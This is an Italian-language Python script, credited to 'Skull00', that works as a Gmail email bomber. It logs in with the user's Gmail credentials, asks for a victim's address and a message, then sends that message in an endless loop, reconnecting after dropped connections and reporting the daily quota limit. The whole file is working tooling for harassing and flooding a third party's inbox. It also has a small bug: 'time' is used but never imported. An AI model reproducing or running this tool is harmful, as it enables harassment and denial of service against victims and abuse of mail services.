#!/usr/bin/python
# coding: utf8
# Autore: Skull00
import smtplib as s
import getpass,sys,readline,socket
global end,red,blue,bright_green,bright_yellow,version,gmail
end = '\033[0m'
red = '\033[1;31m'
blue = '\033[1;34m'
bright_green = '\033[1;32m'
bright_yellow = '\033[1;33m'
version = "v1.0.0"

try:
    gmail = s.SMTP("smtp.gmail.com:587")
except socket.gaierror:
    print("\n[%s-%s] Nessuna connessione\n"%(red,end))
    sys.exit()

def main():
    try:
        print("\n[ LOGIN ]")
        username = raw_input("(Email) > ")
        password = getpass.getpass(prompt='(Password) > ')
    except (KeyboardInterrupt,EOFError):
        print("\n[%s-%s] Interrotto\n"%(red,end))
        sys.exit()
    try:
        gmail.starttls()
    except s.SMTPException:
        print("\n[%s-%s] Connessione sicura non riuscita\n"%(red,end))
        sys.exit("")
    try:
        gmail.login(username, password)
        print("\n[%s+%s] Login eseguito\n"%(bright_green,end))
        flooder(username)
    except s.SMTPAuthenticationError:
        print("\n[%s-%s] Credenziali non valide\n"%(red,end))
        sys.exit()
    print("\n[%s-%s] Qualcosa è andato storto...\n"%(red,end))
    sys.exit()

def flooder(username):
    try:
        email = raw_input("(Email Vittima) > ")
        message = raw_input("(Messaggio) > ")
    except (KeyboardInterrupt,EOFError):
        print("\n[%s-%s] Interrotto\n"%(red,end))
        return main()
    try:
        gmail.sendmail(username, email, message)
    except s.SMTPRecipientsRefused:
        print("\n[%s-%s] Indirizzo email rifiutato\n"%(red,end))
        return flooder(username)
    except s.SMTPDataError as e:
        if e.smtp_code == 550:
            print("\n[%s-%s] Quota giornaliera raggiunta per l'email:"%(red,end))
            print("### %s\n"%(username))
            return main()
        else:
            print("\n[%s-%s] Email o Messaggio rifiutati\n"%(red,end))
        sys.exit()
    except s.SMTPConnectError:
        print("\n[%s-%s] Errore di connessione col server\n"%(red,end))
        sys.exit()
    except s.SMTPSenderRefused:
        print("\n[%s-%s] Indirizzo email rifiutato\n"%(red,end))
        return flooder(username)
    print("\n[%s*%s] Ctrl + C per fermare\n"%(bright_yellow,end))
    connection_error = 0
    spediti = 1
    while True:
        try:
            sys.stdout.write("\r" + "[ Spediti ]-# %s "%(spediti))
            sys.stdout.flush()
            spediti += 1
            gmail.sendmail(username, email, message)
        except (KeyboardInterrupt,EOFError):
            sys.stdout.flush()
            print("\n\n[%s-%s] Interrotto\n"%(red,end))
            return flooder(username)
        except s.SMTPServerDisconnected:
            print("[%s-%s] Connessione al server persa, riprovo..."%(red,end))
            time.sleep(1.5)
            connection_error += 1
            if connection_error == 5:
                sys.exit("\n[%s-%s] Impossibile ristabilire la connessione\n"%(red,end))
            continue
        except s.SMTPResponseException as e:
            print("\n[%s-%s] Errore col servizio SMTP\n"%(red,end))
            sys.exit()

if __name__ == "__main__":
    print("""
   _________             __
  / __/ _/ /__  ___  ___/ / # %s
 / _// _/ / _ \/ _ \/ _  /  # Skull00
/___/_//_/\___/\___/\_,_/

### Per procedere devi autenticarti a Gmail con
### le tue credenziali come Email e Password
### Questa operazione è completamente sicura
    """%(version))
    main()
